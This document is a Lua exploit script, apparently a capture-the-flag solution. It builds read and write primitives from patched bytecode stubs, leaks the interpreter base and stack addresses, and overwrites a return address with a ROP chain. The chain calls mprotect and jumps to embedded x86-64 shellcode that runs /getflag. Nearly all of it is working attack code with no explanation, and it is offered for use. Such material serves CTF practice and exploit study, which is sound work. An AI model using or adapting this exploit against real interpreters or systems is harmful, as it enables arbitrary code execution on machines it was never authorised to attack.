-- You should modify the bytecode of addrof,write_tbl and read_add16 in pwn.out

local function addrof(x)
	local MAGIC=0x13371337
end
local function write_tbl(a,v)
	local MAGIC=0xdeadbeef
end
local function read_add16(a)
	local MAGIC=0x19198101
end


local function read(a)
	return read_add16(a-16)
end
local function write(a,v)
	-- str+24-12
	-- will spoil a byte @ a+8
	local tbl=string.pack("I4j",256,a)
	write_tbl(addrof(tbl)+24-12,v)
end

local shellcode='H\x89\xe7j\x16X\x0f\x05j\x01\xfe\x0c$H\xb8getflag!PH\x89\xe6j\x05_j\x08Zj\x01X\x0f\x05j\x04_1\xf6j!X\x0f\x05j\x01\xfe\x0c$H\xb8/getflagPH\x89\xe71\xd21\xf6j;X\x0f\x05'
local function pwn()
	local base=addrof(tostring)-0x2ab50
	local penviron=base+0x52cd8
	local start_c=base+0x3bb5
	local environ=read(penviron)
	local addr_startc=nil
	for i=0,100 do
		local res=read(environ-i*8)
		if res==start_c then
			addr_startc=environ-i*8
			break
		end
	end
	-- assert(addr_startc~=nil)
	local pretaddr=addr_startc-48
	-- log('pretaddr',pretaddr)
	-- log('retaddr',read(pretaddr)) --0x7ffff7fdd560
	-- step 02: build rop
	-- base+0x3127,0,base+0x38a58,
	chain={base+0x3127,addrof(shellcode)+24,base+0x62b9,#shellcode,base+0x3825f,7,base+0x3d11f,addrof(shellcode)+24} --mprotect(shellcode,len,7);shellcode()
	for i=1,#chain do 
		write(pretaddr+8*(i-1),chain[i])
	end
end
pwn()
